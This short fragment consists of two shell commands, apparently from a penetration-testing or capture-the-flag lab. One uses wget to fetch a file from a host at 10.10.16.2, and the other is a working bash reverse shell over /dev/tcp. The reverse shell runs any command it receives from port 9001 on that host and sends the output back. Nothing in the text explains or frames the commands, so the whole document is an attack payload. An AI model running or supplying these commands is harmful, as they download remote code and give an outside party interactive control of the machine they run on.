wget http://10.10.16.2:8000/executing
exec 5<>/dev/tcp/10.10.16.2/9001;cat <&5 | while read line; do $line 2>&5 >&5; done